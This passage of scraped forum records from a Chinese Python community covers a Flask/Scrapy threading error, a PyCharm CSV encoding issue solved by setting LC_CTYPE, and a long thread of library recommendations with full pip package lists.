install_shutdown_handlers(self._signal_shutdown)\n      File \"/usr/local/lib/python2.7/site-packages/scrapy/utils/ossignal.py\", line 21, in install_shutdown_handlers\n        reactor._handleSignals()\n      File \"/usr/local/lib/python2.7/site-packages/twisted/internet/posixbase.py\", line 295, in _handleSignals\n        _SignalReactorMixin._handleSignals(self)\n      File \"/usr/local/lib/python2.7/site-packages/twisted/internet/base.py\", line 1154, in _handleSignals\n        signal.signal(signal.SIGINT, self.sigInt)\n    ValueError: signal only works in main thread\n</code></pre>\n<p>附上核心代码</p>\n<pre><code>@app.route('/run')\ndef run():\n    project = dict()\n    project['name'] = 'test'\n    project['mod'] = 'debug'\n    project['script'] = \"\"\"\n# -*- coding: utf-8 -*-\n\nimport scrapy\n\n\nclass TiebaCategorySpider(scrapy.Spider):\n    name = \"tieba_category\"\n\n    start_url = 'http://tieba.baidu.com/f/index/forumclass'\n\n    def start_requests(self):\n        yield scrapy.Request(self.start_url)\n\n    def parse(self, response):\n        try:\n            links = response.xpath('//ul[@class=\"item-list-ul clearfix\"]/li/a')\n            for i in links:\n                a = i.xpath('@href').extract_first()\n                name = i.xpath('text()').extract_first()\n                yield scrapy.Request(self.repair_url(a), callback=self.parse_category, meta={'sub_category': name})\n        except Exception as e:\n            print e\n            return\n\n    def parse_category(self, response):\n        a_list = response.xpath('//a[@class=\"ba_href clearfix\"]')\n        category = response.xpath('//div[@class=\"ba_class_title\"]/text()').extract_first()\n        for i in a_list:\n            item = CategoryItem()\n\n            item['img'] = i.xpath('img[@class=\"ba_pic\"]/@src').extract_first()\n            item['name'] = i.xpath('div[@class=\"ba_content\"]/p[@class=\"ba_name\"]/text()').extract_first()\n            item['member_count'] = i.xpath('div[@class=\"ba_content\"]//span[@class=\"ba_m_num\"]/text()').extract_first()\n            item['post_count'] = i.xpath('div[@class=\"ba_content\"]//span[@class=\"ba_p_num\"]/text()').extract_first()\n            item['sub_category'] = response.meta.get('sub_category')\n            item['desc'] = i.xpath('div[@class=\"ba_content\"]//p[@class=\"ba_desc\"]/text()').extract_first()\n            item['category'] = category\n\n            yield item\n\n        next_url = response.xpath('//div[@class=\"pagination\"]/a[@class=\"next\"]/@href').extract_first()\n        if next_url:\n            yield scrapy.Request(self.repair_url(next_url), callback=self.parse_category,\n                                 meta={'sub_category': response.meta.get('sub_category')})\n\n    @staticmethod\n    def repair_url(url):\n        if url.startswith('http'):\n            pass\n        else:\n            url = ''. join(['http://tieba.baidu.com', url])\n        return url\n\n    \"\"\"\n    loader = ProjectLoader(project)\n    module = loader.load_module('test_spider')\n    a = module.__dict__\n    for each in list(six.itervalues(module.__dict__)):\n        if inspect.isclass(each) and issubclass(each, scrapy.Spider):\n            module.__dict__['__handler_cls__'] = each\n    _class = module.__dict__.get('__handler_cls__')\n    assert _class is not None, \"need BaseHandler in project module\"\n\n    spider = _class()\n\n    settings = get_project_settings()\n    crawler = CrawlerProcess(settings)\n    crawler.crawl(spider)\n    # crawler.start()\n    return repr(module.__dict__)\n</code></pre>\n</div></div>"], "reply": "2", "tittle": "尝试用 Flask 调用 scrapy 的 commandline 来执行爬虫,报 signal only works in main thread", "comment": ["意思就是你这一样必须在主线程执行\r", "crawler = CrawlerProcess(settings)", "Scrapy 依赖 twisted ，应该是 twisted 的异步网络模型的要求"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个很简单的脚本, 使用<code>os.system()</code>执行了一句 Java 语句, 这句 Java 的作用就是解析 pdf 文件, 输出文本到一个 csv 文件.</p>\n<p>问题是这个脚本如果在 PyCharm 里跑的话, 写入的编码就是 ASCII, 打开中文就是问号; 如果在终端直接运行, 写入的编码就是 UTF-8, 中文显示一切正常</p>\n<p>PyCharm 中有关 encoding 的设置都是 utf-8.</p>\n<p>代码如下</p>\n<pre><code># coding=utf-8\nimport os\nimport chardet\n\n\ncmd = 'java -jar ~/tabula.jar ~/80032035 陈勇.pdf -p all -n -o pdf.csv'\nos.system(cmd)\nf = open(\"pdf.csv\", 'rb')\nfor l in f.readlines():   # 这两句检查文本编码方式\n    print chardet.detect(l)\n</code></pre>\n<p>在 PyCharm 中运行的话, pdf.csv 是这样的:</p>\n<p><img alt=\"\" src=\"https://ww4.sinaimg.cn/large/006tNbRwgw1fb6jzx9snxj308h0ae3z7.jpg\"></p>\n<p><code>{'confidence': 1.0, 'encoding': 'ascii'}</code> 输出显示编码方式是 ASCII</p>\n<p>如果在终端运行的话, pdf.csv 是这样的:</p>\n<p><img alt=\"\" src=\"https://ww1.sinaimg.cn/large/006tNbRwgw1fb6k14ztymj307x07gwf0.jpg\"></p>\n<p><code>{'confidence': 0.99, 'encoding': 'utf-8'}</code> 输出显示编码方式是 UTF-8</p>\n<p>现在不知道问题出在哪里了...求教</p>\n</div></div>"], "reply": "5", "tittle": "关于 Pycharm 非常奇怪的问题, 麻烦进来看下", "comment": ["open 那里指定一下 encoding", "感觉可能是 PyCharm 和终端的环境变量不同导致的问题，尝试分别在两处运行以下代码看看环境变量有什么不同：\r", "import os\r", "print os.environ", "你用 notepad++看看两次生成的 csv 文件的具体编码", "有可能是你调用的那个 jar 库根据环境变量生成了不同的编码格式的 csv 文件", "cmd 。。。。\r", "在执行你的 cmd 之前，执行一下 chcp 65001 切换 Windows 默认代码页从 cp936 到 utf-8 。。。", " 谢谢, 您的方法是对的\r", "\r", "对比了之后发现, PyCharm 的环境变量中是 'LC_CTYPE': 'en_US.UTF-8'\r", "终端中'LC_CTYPE': 'UTF-8'\r", "\r", "在 PyCharm 中设置了环境变量之后就 OK 了,  非常感谢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>临时想到的，感觉平时用的也就这几个库，列一下，欢迎大家补充</p>\n<p>（名字这么多叹号不是想让家进来聊聊嘛，套路你懂么）</p>\n<p>正题：</p>\n<ol>\n<li>requests   - HTTP 库吧，主要爬虫</li>\n<li>Flask        - 主要 Restful API</li>\n<li>peewee    - 读写数据库 （终于狠下心放弃 SQLAlchemy ）</li>\n</ol>\n<p>感觉我平时也就用这些，够用了，接下来看你们的了。。。</p>\n</div></div>"], "reply": "77", "tittle": "Python，我用这些库就够了！！！", "comment": ["有没有比 matplotlib 更好的绘图库？求解", "anaconda", "1 2 我用 aiohttp 代替", " 好吧，我服，所以要多交流交流啊\r", "\r", "代替 Flask 应该可以有，但是 代替 requests 我要去看看。", "virtualenvwrapper", "  这个是啥？ Sublime text 插件？", " 绘图咱不懂。。。", "peewee 我也用， SQLAlchemy 太复杂了", " 我现在用 pyvenv ，是不是 python3 自带的忘了； virtualenvwrapper 以前用过", "  我是因为 SQL Server ...现在打算放弃 SQL Server 了...", "collections 用的也比较多吧", "- 库\r", "    - tornado\r", "    - sqlalchemy - 只用核心部分( ", "), 不用 ORM 部分.\r", "    - sqlalchemy-migrate - 感觉不好用, 但苦于没有好的替代品, ", " 好像还没稳定.\r", "    - jinja2\r", "    - pycurl (主要用于 tornado.curl_httpclient 实现异步爬虫)\r", "    - enum34 \r", "    - mock\r", "    - celery\r", "    - raven (sentry)\r", "    - pycrypto\r", "- 工具\r", "    - virtualenvwrapper(virtualenv)\r", "    - pylint\r", "    - flake8\r", "    - tox\r", "    - coverage\r", "    - fabric  部署", "直接用 pymongo 和 redis-py 操作数据库的路过", " 看到好多一直没去好好看看的库啊\r", "\r", "工具里面 fabric 是要去搞下，其他有些 pylint 和 flake8 编辑器插件也能覆盖了", " pylint 和 flake8 分别用在在编辑器, git 钩子和持续集成.", "你的爬虫不用 BeautifulSoup ? ", " ", "\r", "Windows 福利", " 嗯", " 既然问了，那我也只能回答，以前用，现在我觉得 pyquery 比较省事。。。", "  这个我服，好吧，我以前也一直下那种编译好的， exe 直接安装的，但是这么多，你也要挑一下啊", "补充两个:\r", "\r", "- pbr      简化 setup.py\r", "- bumpversion  一键发版: 更改相应文件中的版本号, 提交并打 tag.", "numpy\r", "matplotlib", "做统计的表示没有 numpy 不能忍，没有 pandas 好像缺点什么", "默默的点了收藏，大家继续啊。。", "scipy", "下面直接装 Anaconda3 \r", "然后升级 pandas 和 numpy", " 我就靠 pandas 读 csv/excel 了，省了太多事", "parsel ， scrapy 的选择器，小爬虫用 requests+parsel 很爽", "SQLAlchemy 好像的确是挺难用", "jedi  python 智能补全", "python 就是简单啊，各种 lib 的易用性做的太好了", "难道没有 Django", "包管理\r", " - pip\r", " - wheel 没这俩其他白扯\r", "http\r", " - requests 不解释\r", "html dom\r", " - lxml 随着最近深度使用，发现 xpath 语法真心强大\r", " - bs4 ， pyquery 之流，选择器的语法，挺基础的\r", "命令行:\r", " - click\r", " - docopt 神器\r", "路径\r", " - pathlib 据说不错，没用过\r", "文档\r", " - sphinx 生成 pdf 贼好用\r", "web 框架\r", " - Django 大而全\r", " - Flask 轻快小巧\r", "界面\r", " - PyQt 没用过不过也提一下吧\r", "以上\r", "PS:本人一般只用 py 写点小脚本小爬虫，以上也就够了，在这留个备份\r", "PPS:爬虫我现在已经全面转到 requests+lxml ，纯手撸，简直爽的飞起\r", "PPPS:如果有其他好用的欢迎补充阿~", "人生苦短，改用 C#\r", "\r", "（标准库啥都有。。。还跨各种桌面和移动平台）", " \r", "numpy pandas matplotlib scipy sympy\r", "这几个 C#里都没有类似的吧", "beautifulsoup 和 fabric 我都在用啊", "pyqt4", " @", " @", " 几位看起来都是数据分析褂的大神啊", " click 和 docopt 都用过，都觉得不错，但是还是觉得缺点什么。。。", " 乱入的 C#大神么？", "beautifulsoup 、 GraphLab-Create 、 ipython 、 jupyter 、 numpy\r", "至于其他的，可以看看 O'Reilly 的免费书[20 Python Libraries You Aren't Using (But Should)]( ", ")\r", "里面有些还是挺有用的", "  20 Python Libraries You Aren't Using (But Should) 这个真的可以有", "安装了 anaconda ，科学计算什么的 pandas 才是最好的库，楼上要的画图库还有 seaborn ，这个可以替代 plt ，交互式的还有 bokeh 也不错，还一个服务叫 plot.ly 也还行", "tensorflow", " 嗯，这个重量级，如雷贯耳，然而碰都没碰过。。。", "你们都不用 MySQLdb 么", "py 明明优点就是库多，你却说这些就足够了", "pymysql,PIL", " 库多的目的是让更多人找到自己合适的库吧，而不是让一个人找到更多的库。几个库对于个人够用没毛病……", "来一个， huey", " +1\r", "\r", " \r", "库多的确是 py 的优点，但是多也增加了直接找到自己想要库的难度（而且质量说实在的，也是有高低的）\r", "\r", "就比如我当时做爬虫，也看过其他， scrappy 也看过，太重了，不适合，选了好久才发现 requests 的\r", "\r", "所以这里大家多交流下，好的库是会发光的，引起共鸣的，正好别人推荐了好的库是自己一直在找寻的，或者自己想要去看的库也是得到过别人认可的，那就省了好多事了\r", "\r", "个人见解，欢迎交流", " Django 陆续从头到底看了两遍，结果还是用 flask 多，中间也尝试过　 bottle 和 web.py ；其实 bottle 也不错的，就是大家用的少，插件也不是很多，遇到坑出坑难度比较大。。。", " parsel 倒是没看到过。。嗯，去看下", "  @", " pymysql,MySQLdb  当时都用过的，后来用了 peewee", " 好像是 peewee 作者的库，他是有多爱那“ huey ”，库的名字　测试样例　都是 huey...", "弱问 peewee 比 SQLAlchemy 好在哪？我一直用 SQLAlchemy 。求指点", "  这个问题好，我不一定能回答好，我尽力。最好自己用用体会，不会占很多时间，上手极快\r", "\r", "SQLAlchemy 我觉得是这样的，我以前用来连 SQL Server 的，不用这个还不行；感觉很重量，源码也没看，估计太大了，受不了；那个文档也是硬着头皮读的，感觉能看下来也不容易，每次写还是要去看文档。。。不知道是不是我自己问题。反正觉得重量级的，啥都能做，就是要去查\r", "\r", "就比如说一个表数据搜索出来转 json 吧，找到 stackoverflow 才找到的\r", "\r", "peewee 虽然不支持 sql server ，但是其他的数据库常见的都支持，而且单文件吧，看源码也不吃力（有问题动手也有方向感。。。）\r", "然后他的 example 还有 playhouse 看看还是蛮符合你实际使用遇到的问题的，比如那个倒 json ， playhouse 中就有\r", "我主要觉得文档读着不吃力，能看源码，用着也没毛病，语法也人性化，至于功能现在属于浅尝，蜜月期，没感觉到毛病（但是感觉功能上还是 SQLalchemy 全的，我就是有这种想法）\r", "\r", "为什么弃，就是觉得太重， peewee 感觉轻，觉得作者就是遇到其他库遇到问题后自己造了个轮子方便大家用的感觉\r", "\r", "\r", "个人感觉，欢迎大家补充", "> pip list\r", "\r", "arrow (0.8.0)\r", "attrs (16.2.0)\r", "autopy (0.51)\r", "backports-abc (0.4)\r", "backports.shutil-get-terminal-size (1.0.0)\r", "beautifulsoup4 (4.5.1)\r", "certifi (2016.9.26)\r", "cffi (1.8.3)\r", "characteristic (14.3.0)\r", "chardet (2.3.0)\r", "ChatterBot (0.4.11)\r", "click (6.6)\r", "colorama (0.3.7)\r", "constantly (15.1.0)\r", "contextlib2 (0.5.4)\r", "coverage (4.2)\r", "coveralls (1.1)\r", "cssselect (1.0.0)\r", "decorator (4.0.10)\r", "defusedxml (0.4.1)\r", "demjson (2.2.4)\r", "discord-simple (0.0.1.15)\r", "Django (1.10.3)\r", "docopt (0.6.2)\r", "docutils (0.12)\r", "elasticsearch (5.0.1)\r", "enum34 (1.1.6)\r", "et-xmlfile (1.0.1)\r", "eventlet (0.19.0)\r", "Flask (0.11.1)\r", "Flask-Cors (3.0.2)\r", "Flask-GoogleMaps (0.2.4)\r", "Flask-Login (0.4.0)\r", "funcsigs (1.0.2)\r", "future (0.16.0)\r", "fuzzywuzzy (0.12.0)\r", "geographiclib (1.46.3)\r", "Geohash (1.0)\r", "geopy (1.11.0)\r", "gevent (1.1.2)\r", "googlemaps (2.4.4)\r", "gpsoauth (0.4.0)\r", "gpxpy (1.1.1)\r", "greenlet (0.4.9)\r", "haversine (0.4.5)\r", "http-prompt (0.7.0)\r", "httpie (0.9.6)\r", "idna (2.1)\r", "imageio (1.6)\r", "incremental (16.10.1)\r", "iniherit (0.3.4)\r", "ipaddress (1.0.17)\r", "ipython (5.1.0)\r", "ipython-genutils (0.1.0)\r", "itsdangerous (0.24)\r", "jdcal (1.3)\r", "Jinja2 (2.8)\r", "jsondatabase (0.1.3)\r", "lxml (3.6.1)\r", "MarkupSafe (0.23)\r", "mock (2.0.0)\r", "mod-wsgi (4.4.23+ap24vc9)\r", "msgpack-python (0.4.8)\r", "MySQL-python (1.2.5)\r", "Naked (0.1.31)\r", "networkx (1.11)\r", "nltk (3.2.1)\r", "numpy (1.11.0)\r", "oauthlib (2.0.0)\r", "openpyxl (2.4.0)\r", "paho-mqtt (1.2)\r", "pandas (0.18.1)\r", "parsel (1.0.3)\r", "parsimonious (0.7.0)\r", "path.py (8.2.1)\r", "pathlib2 (2.1.0)\r", "pbr (1.10.0)\r", "peewee (2.8.5)\r", "pickleshare (0.7.4)\r", "Pillow (3.4.2)\r", "pip (9.0.1)\r", "polyline (1.3.1)\r", "progressbar (2.3)\r", "prompt-toolkit (1.0.9)\r", "protobuf (3.0.0b4)\r", "protobuf-to-dict (0.1.0)\r", "py2exe (0.6.9)\r", "pyasn1 (0.1.9)\r", "pyasn1-modules (0.0.8)\r", "pycparser (2.17)\r", "pycrypto (2.6.1)\r", "pycryptodomex (3.4.3)\r", "pycurl (7.43.0)\r", "PyDispatcher (2.0.5)\r", "Pygments (2.1.3)\r", "pymongo (3.3.1)\r", "pyOpenSSL (16.2.0)\r", "pypiwin32 (219)\r", "PyQt4 (4.11.4)\r", "pyquery (1.2.13)\r", "pyreadline (2.1)\r", "pyspider (0.3.7)\r", "python-dateutil (2.5.3)\r", "python-engineio (1.0.3)\r", "python-slugify (1.2.1)\r", "python-socketio (1.4.2)\r", "python-telegram-bot (5.0.0)\r", "python-twitter (3.1)\r", "pytz (2016.7)\r", "pywin32 (220)\r", "PyYAML (3.11)\r", "queuelib (1.4.2)\r", "raven (5.23.0)\r", "records (0.4.3)\r", "requests (2.10.0)\r", "requests-mock (1.0.0)\r", "requests-oauthlib (0.7.0)\r", "s2sphere (0.2.4)\r", "Scrapy (1.1.1)\r", "selenium (3.0.1)\r", "service-identity (16.0.0)\r", "setuptools (28.8.0)\r", "shadowsocks (2.8.2)\r", "shellescape (3.4.1)\r", "simplegeneric (0.8.1)\r", "singledispatch (3.4.0.3)\r", "six (1.9.0)\r", "socketIO-client (0.7.0)\r", "splinter (0.7.5)\r", "SQLAlchemy (1.1.3)\r", "tablib (0.11.2)\r", "termcolor (1.1.0)\r", "textblob (0.11.1)\r", "timeout-decorator (0.3.2)\r", "tornado (4.4.2)\r", "tqdm (4.9.0)\r", "traitlets (4.3.1)\r", "tushare (0.5.5)\r", "Twisted (16.5.0)\r", "u-msgpack-python (2.3.0)\r", "Unidecode (0.4.19)\r", "urllib3 (1.19)\r", "vboxapi (1.0)\r", "virtualenv (15.1.0)\r", "w3lib (1.15.0)\r", "wcwidth (0.1.7)\r", "web.py (0.38)\r", "websocket-client (0.37.0)\r", "Werkzeug (0.11.11)\r", "wheel (0.29.0)\r", "win-unicode-console (0.5)\r", "WsgiDAV (2.0.1)\r", "WTForms (2.1)\r", "xlrd (1.0.0)\r", "xxhash (0.6.1)\r", "youtube-dl (2016.11.4)\r", "yoyo-migrations (5.0.3)\r", "zope.interface (4.3.2)", "有没有人总结个 Java 版的？", "  想学习下你怎么组织代码骨架的,  在使用 peewee 的时候, 不知道方不方便导出一个 demo 放 github 上 , 学习学习", "  我因为也是最近才开始用 peewee 的，还没有一个完整的项目\r", "\r", "demo 的话， 我自己整理的模板里面倒是有一个很简单的  Flask + peewee + nginx 的 Demo template, 你可以先看下（这个主要是给自己以后写的时候，配置啥的方便一点）\r", "\r", "[", " ", ")\r", "\r", "里面\r", "\r", "models.py 最简单的 peewee 的例子， peewee doc 的都比这个完整\r", "app.py      就是最简单的集成 peewee 到 flask\r", "\r", "还在整理，你可以先看下，自己扩展", "  额， 不支持 markdown\r", "\r", "地址连接有点问题，是下面这个\r", "\r", "jupyter scikit-learn keras theano", "  好的, 谢谢", " 麻烦问下 mssql 用什么库链接并插入图像数据，一直无法用 pymssql 插入图片数据，麻烦问问\r", "另外插入更新数据库数据你们是每条语句都建立链接，然后打开数据库执行一条语句，然后在关闭数据库。还是有什么方法同时执行", "Python 好玩的库太多了...这点哪够...\r", "那些专家研究出来的人工智能、机器学习随手都能拿来用，这就是 Python 的强大", " 说的是  人工智能、机器学习的太多了，大神推几个精华的，让我们少走点弯路啊。。。", " \r", "一个个回答吧\r", "\r", "1. 插入图像数据，我知道 SQL SERVER 是有一个 image 字段，可以存这种二进制数据，但是你的业务是否真的有必要这么存，可以找个文件服务器存图片，然后数据库存服务器图片存放地址这种方案是否可以呢？ 因为你存二进制，那个表会很大，迁移维护都麻烦。。。 当然如果你一定要存，我不知道你说的无法插入图像数据是怎么回事，能否具体点？ pymssql 可以直接写 sql 存吧？也不行？图片转二进制存呢？\r", "\r", "2.  关于关闭数据库，我一般用来用在 Flask 里面，我特地去翻了下以前的代码，我也惊呆了，以前没好好研究，虽然觉得有问题，但是也就得过且过了。。。\r", "\r", "用了 Flask-SQLalchemy,结果整个里面就一句，而且跑下来没毛病（或者我还没意识到毛病）。。。\r", "\r", "SQLALCHEMY_DATABASE_URI = 'mssql+pyodbc://usr:password@server:port/database'\r", "\r", "然后就没去管它。。。。可以研究下 Flask-SQLalchemy 里面有没有这个控制逻辑。\r", "\r", "然后自己写吧，单独的用，我想想我应该是会手动连，然后执行业务吧（也不用执行一条就关闭吧），捕捉到异常就回滚，然后手动关闭数据库；还有你可以试试 with 嘛，这样不用自己手动关了", "alabaster (0.7.9)\r", "algorithms (1.0)\r", "amqp (2.1.4)\r", "anaconda-client (1.6.0)\r", "anaconda-navigator (1.2.3)\r", "appdirs (1.4.0)\r", "appnope (0.1.0)\r", "appscript (1.0.1)\r", "apptools (4.4.0)\r", "argcomplete (1.0.0)\r", "argh (0.26.2)\r", "args (0.1.0)\r", "arrow (0.10.0)\r", "astroid (1.4.7)\r", "astropy (1.3)\r", "attrs (16.3.0)\r", "Babel (2.3.4)\r", "backports-abc (0.5)\r", "backports.shutil-get-terminal-size (1.0.0)\r", "baidupan (0.0.1)\r", "baidupcsapi (0.3.8)\r", "basemap (1.0.7)\r", "beautifulsoup4 (4.5.1)\r", "billiard (3.5.0.2)\r", "bitarray (0.8.1)\r", "blaze (0.10.1)\r", "blinker (1.4)\r", "bokeh (0.12.3)\r", "boto (2.45.0)\r", "Bottlechest (0.7.1)\r", "Bottleneck (1.1.0)\r", "bs4 (0.0.1)\r", "buildozer (0.32)\r", "bypy (1.2.22)\r", "bz2file (0.98)\r", "cairocffi (0.7.2)\r", "celery (4.0.2)\r", "certifi (2016.9.26)\r", "cffi (1.9.1)\r", "chainer (1.16.0)\r", "characteristic (14.3.0)\r", "chardet (2.3.0)\r", "ChatterBot (0.5.3)\r", "chest (0.2.3)\r", "click (6.6)\r", "click-plugins (1.0.3)\r", "cligj (0.4.0)\r", "clint (0.5.1)\r", "cloudpickle (0.2.1)\r", "clyent (1.2.2)\r", "cmd2 (0.6.8)\r", "colorama (0.3.7)\r", "conda (4.2.13)\r", "conda-build (2.0.12)\r", "conda-manager (0.4.0)\r", "conda-verify (2.0.0)\r", "configobj (5.0.6)\r", "constantly (15.1.0)\r", "contextlib2 (0.5.4)\r", "coverage (4.1)\r", "coveralls (1.1)\r", "creepy (0.1.6)\r", "cryptography (1.6)\r", "cssselect (1.0.0)\r", "cycler (0.10.0)\r", "Cython (0.25.2)\r", "cytoolz (0.8.2)\r", "dask (0.12.0)\r", "datashape (0.5.3)\r", "decorator (4.0.10)\r", "defusedxml (0.4.1)\r", "demjson (2.2.4)\r", "descartes (1.0.2)\r", "dill (0.2.5)\r", "DIRECT (1.0.1)\r", "discord-simple (0.0.1.17)\r", "Django (1.10.4)\r", "docopt (0.6.2)\r", "docutils (0.13.1)\r", "dynd (0.7.3.dev1)\r", "elasticsearch (5.0.1)\r", "enum-compat (0.0.2)\r", "enum34 (1.1.6)\r", "et-xmlfile (1.0.1)\r", "eventlet (0.20.0)\r", "Fabric (1.13.1)\r", "fastcache (1.0.2)\r", "feedgenerator (1.8)\r", "filelock (2.0.7)\r", "Fiona (1.7.0.post2)\r", "flake8 (3.2.1)\r", "Flask (0.12)\r", "Flask-Cors (2.1.2)\r", "Flask-GoogleMaps (0.2.4)\r", "Flask-Login (0.4.0)\r", "funcsigs (1.0.2)\r", "future (0.16.0)\r", "fuzzywuzzy (0.14.0)\r", "gensim (0.13.2)\r", "geographiclib (1.46.3)\r", "Geohash (1.0)\r", "geopandas (0+unknown)\r", "geopy (1.11.0)\r", "get (0.0.0)\r", "gevent (1.1.2)\r", "gitdb2 (2.0.0)\r", "GitPython (2.1.1)\r", "gizeh (0.1.10)\r", "glueviz (0.9.1)\r", "googlemaps (2.4.5)\r", "gpsoauth (0.4.0)\r", "gpxpy (1.1.2)\r", "greenlet (0.4.11)\r", "h5py (2.6.0)\r", "hashids (1.1.0)\r", "haversine (0.4.5)\r", "HeapDict (1.0.0)\r", "http-prompt (0.8.0)\r", "httpie (0.9.9)\r", "idna (2.1)\r", "imageio (2.1.1)\r", "imagesize (0.7.1)\r", "incremental (16.10.1)\r", "iniherit (0.3.6)\r", "ipaddress (1.0.17)\r", "ipykernel (4.5.2)\r", "ipython (5.1.0)\r", "ipython-genutils (0.1.0)\r", "ipywidgets (5.2.2)\r", "itsdangerous (0.24)\r", "jdcal (1.3)\r", "jedi (0.9.0)\r", "jieba (0.38)\r", "Jinja2 (2.8)\r", "joblib (0.9.4)\r", "jsondatabase (0.1.6)\r", "jsonschema (2.5.1)\r", "jupyter (1.0.0)\r", "jupyter-client (4.4.0)\r", "jupyter-console (5.0.0)\r", "jupyter-core (4.2.1)\r", "Keras (1.0.8)\r", "Kivy (1.9.1)\r", "Kivy-Garden (0.1.4)\r", "kombu (4.0.2)\r", "lazy-object-proxy (1.2.1)\r", "llvmlite (0.15.0)\r", "locket (0.2.0)\r", "lxml (3.6.4)\r", "Mako (1.0.6)\r", "Markdown (2.6.6)\r", "MarkupSafe (0.23)\r", "matplotlib (1.5.1)\r", "mccabe (0.5.3)\r", "mistune (0.7.3)\r", "mock (2.0.0)\r", "mod-wsgi (4.5.11)\r", "mpmath (0.19)\r", "msgpack-python (0.4.8)\r", "multipledispatch (0.4.9)\r", "munch (2.0.4)\r", "Naked (0.1.31)\r", "nb-anacondacloud (1.2.0)\r", "nb-conda (2.0.0)\r", "nb-conda-kernels (2.0.0)\r", "nbconvert (4.2.0)\r", "nbformat (4.2.0)\r", "nbpresent (3.0.2)\r", "networkx (1.11)\r", "nltk (3.2.1)\r", "nose (1.3.7)\r", "notebook (4.3.0)\r", "numba (0.30.0)\r", "numexpr (2.6.1)\r", "numpy (1.11.2)\r", "oauthlib (2.0.1)\r", "odo (0.5.0)\r", "openpyxl (2.4.0)\r", "Orange3 (3.3.6)\r", "paho-mqtt (1.2)\r", "pandas (0.19.1)\r", "paramiko (2.1.1)\r", "parsel (1.1.0)\r", "parsimonious (0.7.0)\r", "partd (0.3.6)\r", "passlib (1.7.0)\r", "path.py (0.0.0)\r", "pathlib (1.0.1)\r", "pathlib2 (2.1.0)\r", "pathtools (0.1.2)\r", "patsy (0.4.1)\r", "pbr (1.10.0)\r", "peewee (2.8.5)\r", "pelican (3.6.3)\r", "pep8 (1.7.0)\r", "pexpect (4.0.1)\r", "pickleshare (0.7.4)\r", "Pillow (3.4.2)\r", "pip (9.0.1)\r", "pkginfo (1.4.1)\r", "pluggy (0.4.0)\r", "ply (3.9)\r", "polyglot (16.7.4)\r", "post (0.0.0)\r", "prompt-toolkit (1.0.9)\r", "protobuf (3.1.0.post1)\r", "psutil (5.0.1)\r", "ptyprocess (0.5.1)\r", "public (0.0.0)\r", "py (1.4.31)\r", "pyasn1 (0.1.9)\r", "pyasn1-modules (0.0.8)\r", "pycodestyle (2.2.0)\r", "pycosat (0.6.1)\r", "pycparser (2.17)\r", "pycrypto (2.6.1)\r", "pycryptodomex (3.4.3)\r", "pycuda (2016.1.2)\r", "pycurl (7.43.0)\r", "PyDispatcher (2.0.5)\r", "pyface (5.1.0)\r", "pyFirmata (1.0.3)\r", "pyflakes (1.3.0)\r", "pygame (1.9.2)\r", "Pygments (2.1.3)\r", "pygubu (0.9.7.8)\r", "pylint (1.5.4)\r", "pymongo (3.4.0)\r", "PyMySQL (0.7.9)\r", "PyNaCl (1.0.1)\r", "pyopencl (2016.2)\r", "pyOpenSSL (16.2.0)\r", "pyparsing (2.1.4)\r", "pyproj (1.9.5.1)\r", "pyqtgraph (0.9.10)\r", "pyquery (1.2.17)\r", "pyreadline (2.1)\r", "pyserial (3.2.1)\r", "pyspider (0.3.8)\r", "pytest (3.0.5)\r", "python-dateutil (2.6.0)\r", "python-engineio (1.1.0)\r", "python-slugify (1.2.1)\r", "python-socketio (1.6.1)\r", "python-telegram-bot (5.3.0)\r", "python-twitter (3.2)\r", "pytools (2016.2.1)\r", "pytz (2016.10)\r", "PyYAML (3.12)\r", "pyzmq (16.0.2)\r", "QtAwesome (0.3.3)\r", "qtconsole (4.2.1)\r", "QtPy (1.1.2)\r", "query-string (0.0.0)\r", "queuelib (1.4.2)\r", "raven (5.32.0)\r", "records (0.5.0)\r", "redis (2.10.5)\r", "request (0.0.0)\r", "requests (2.12.4)\r", "requests-mock (1.2.0)\r", "requests-oauthlib (0.7.0)\r", "requests-toolbelt (0.7.0)\r", "rope-py3k (0.9.4.post1)\r", "rsa (3.4.2)\r", "ruamel-yaml (-VERSION)\r", "s2sphere (0.2.4)\r", "scikit-image (0.12.3)\r", "scikit-learn (0.18.1)\r", "scipy (0.18.1)\r", "Scrapy (1.3.0)\r", "selenium (2.53.6)\r", "service-identity (16.0.0)\r", "setupfiles (0.0.0)\r", "setuptools (32.3.0)\r", "shadowsocks (2.8.2)\r", "Shapely (1.5.16)\r", "shellescape (3.4.1)\r", "simplegeneric (0.8.1)\r", "singledispatch (3.4.0.3)\r", "six (1.10.0)\r", "smart-open (1.3.4)\r", "smartypants (1.8.6)\r", "smmap2 (2.0.1)\r", "snowballstemmer (1.2.1)\r", "snownlp (0.12.3)\r", "socketIO-client (0.7.2)\r", "sockjs-tornado (1.0.3)\r", "Sphinx (1.5.1)\r", "sphinx-rtd-theme (0.1.9)\r", "splinter (0.7.5)\r", "spyder (3.0.2)\r", "SQLAlchemy (1.1.4)\r", "sqlalchemy-migrate (0.10.0)\r", "sqlparse (0.2.2)\r", "statsmodels (0.6.1)\r", "sympy (1.0)\r", "tables (3.3.0)\r", "tablib (0.11.3)\r", "Tempita (0.5.2)\r", "termcolor (1.1.0)\r", "terminado (0.6)\r", "textblob (0.11.1)\r", "Theano (0.8.2)\r", "timeout-decorator (0.3.2)\r", "toolz (0.8.2)\r", "tornado (4.4.2)\r", "tox (2.5.0)\r", "tqdm (4.10.0)\r", "traitlets (4.3.1)\r", "traits (4.5.0)\r", "traitsui (5.1.0)\r", "tushare (0.6.7)\r", "twine (1.8.1)\r", "Twisted (16.6.0)\r", "typogrify (2.0.7)\r", "u-msgpack-python (2.3.0)\r", "unicodecsv (0.14.1)\r", "Unidecode (0.4.19)\r", "urllib3 (1.19.1)\r", "utils (0.9.0)\r", "vine (1.1.3)\r", "virtualenv (15.1.0)\r", "w3lib (1.16.0)\r", "watchdog (0.8.3)\r", "wcwidth (0.1.7)\r", "websocket-client (0.37.0)\r", "Werkzeug (0.11.11)\r", "wheel (0.29.0)\r", "widgetsnbextension (1.2.6)\r", "wrapt (1.10.8)\r", "xlrd (1.0.0)\r", "XlsxWriter (0.9.4)\r", "xlwings (0.10.1)\r", "xlwt (1.1.2)\r", "zope.interface (4.3.3)", "numpy, pandas, matplotlib, django", "  @", "  好吧，两位大神麻烦还是精简一下，拣几个重点说说，这么多咱消化不了啊。。。。", " \r", "\r", "\r", 